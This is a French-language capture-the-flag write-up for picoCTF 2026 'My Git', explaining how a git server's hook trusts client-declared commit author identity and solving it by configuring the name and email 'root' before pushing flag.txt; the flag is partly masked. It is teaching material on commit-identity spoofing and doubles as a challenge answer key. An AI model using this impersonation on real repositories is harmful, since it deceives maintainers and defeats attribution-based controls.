# 764 — MY GIT

**Événement** : picoCTF 2026 · **Catégorie** : General Skills

> Synthèse rédigée à partir des sources publiques listées en fin de fiche : ce challenge a été
> résolu côté CyLab Academy, mais le writeup d'origine n'a pas été conservé.

## Énoncé

> I have built my own Git server with my own rules! You want the flag - make sure to push the flag.
> Only `flag.txt` pushed by root (name: root, email: root@picoctf) will be updated with the flag.

Un dépôt HTTP et un mot de passe sont fournis sur la page de l'instance.

## Analyse

Le serveur applique un hook qui accorde le flag à condition que le fichier `flag.txt` soit poussé
par un commit attribué à `root <root@picoctf>`. Or l'identité d'un commit est **entièrement déclarée
par le client** (`user.name`, `user.email`) : aucune liaison cryptographique, aucun contrôle côté
serveur. C'est une usurpation d'identité triviale — l'équivalent, côté git, d'un serveur qui ferait
confiance à un nom d'utilisateur envoyé dans un en-tête HTTP.

## Solution

1. Cloner le dépôt avec le mot de passe de la page :

```bash
git clone http://<HOST>:<PORT>/repo.git && cd repo
```

2. Prendre l'identité attendue — localement dans le dépôt :

```bash
git config user.name root
git config user.email root@picoctf
```

3. Créer `flag.txt`, committer et pousser ; le hook réécrit le fichier avec le vrai flag et le
   renvoie dans la sortie du push :

```bash
touch flag.txt && git add flag.txt
git commit -m 'add flag'
git push        # mot de passe de la page
```

## Flag

```
picoCTF{1mp3rs0n4t4_g17_345y_...}
```

Préfixe publié par picoCTF Solutions (suffixe masqué à la source) : le flag complet n'est pas
recopié ici.

## Sources

- [picoCTF Solutions — My Git (picoCTF 2026)](https://picoctfsolutions.com/picoctf-2026-my-git)
- [Cdenton — picoCTF 2026 writeup](https://cdenton1.github.io/2026/03/19/picoCTF-26.html)
- [AYALK94/MY-GIT-picoCTF-2026](https://github.com/AYALK94/MY-GIT-picoCTF-2026)
